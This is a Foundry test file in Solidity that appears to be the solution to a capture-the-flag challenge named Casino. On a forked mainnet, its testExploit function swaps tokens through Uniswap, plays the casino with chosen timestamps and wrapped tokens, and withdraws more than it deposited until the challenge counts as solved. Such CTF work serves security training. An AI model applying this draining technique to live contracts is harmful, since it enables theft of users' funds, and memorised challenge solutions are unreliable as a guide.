// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {IERC20} from "openzeppelin-contracts/contracts/token/ERC20/extensions/ERC20Wrapper.sol";
import {IUniswapV2Router02 as IRouter02} from "v2-periphery/interfaces/IUniswapV2Router02.sol";
import {Test} from "forge-std/Test.sol";
import {MainnetConfig as Config} from "./NetworkConfig.sol";
import {CasinoBase, Casino} from "src/Casino.sol";

contract CasinoTest is Test {
    CasinoBase public base;
    Casino public casino;
    IRouter02 public router;
    address public you;
    address public owner;

    function setUp() external {
        vm.createSelectFork(Config.RPC_URL);
        uint256 startTime = block.timestamp + 60;
        uint256 endTime = startTime + 60;
        uint256 fullScore = 100;
        base =
        new CasinoBase(startTime, endTime, fullScore, Config.USDC, Config.WBTC, Config.WETH, Config.UNISWAPV2_ROUTER02);
        router = IRouter02(Config.UNISWAPV2_ROUTER02);
        you = makeAddr("you");
        deal(Config.USDC, you, 100e6);
        deal(Config.USDC, address(base), 1_000_000e6);
        deal(Config.WETH, address(base), 1_000e18);
        deal(Config.WBTC, address(base), 1e8);
        base.setup();
        casino = base.casino();
    }

    function testExploit() public {
        vm.startPrank(you);
        // play with WETH
        casino.play(Config.WETH, 500e18, true);
        casino.withdraw(Config.WETH, 1_000e18);
        // play with USDC
        IERC20(Config.WETH).approve(address(router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = Config.WETH;
        path[1] = Config.USDC;
        router.swapTokensForExactTokens(500_000e6, 1_000e18, path, you, block.timestamp);
        IERC20(Config.USDC).approve(address(casino), type(uint256).max);
        vm.warp(block.timestamp + 1);
        casino.play(Config.USDC, 500_000e6, true);
        vm.warp(block.timestamp + 1);
        casino.play(casino.CToken(Config.USDC), 500_000e6, true);
        casino.withdraw(Config.USDC, 1_500_000e6);
        // play with WBTC
        IERC20(Config.USDC).approve(address(router), type(uint256).max);
        path = new address[](2);
        path[0] = Config.USDC;
        path[1] = Config.WBTC;
        router.swapTokensForExactTokens(0.5e8, 1_500_000e6, path, you, block.timestamp);
        IERC20(Config.WBTC).approve(address(casino), type(uint256).max);
        vm.warp(block.timestamp + 1);
        casino.play(Config.WBTC, 0.5e8, true);
        vm.warp(block.timestamp + 1);
        casino.play(casino.CToken(Config.WBTC), 0.5e8, true);
        casino.withdraw(Config.WBTC, 1.5e8);
        // solve
        base.solve();
        assertEq(base.isSolved(), true);
        vm.stopPrank();
    }
}
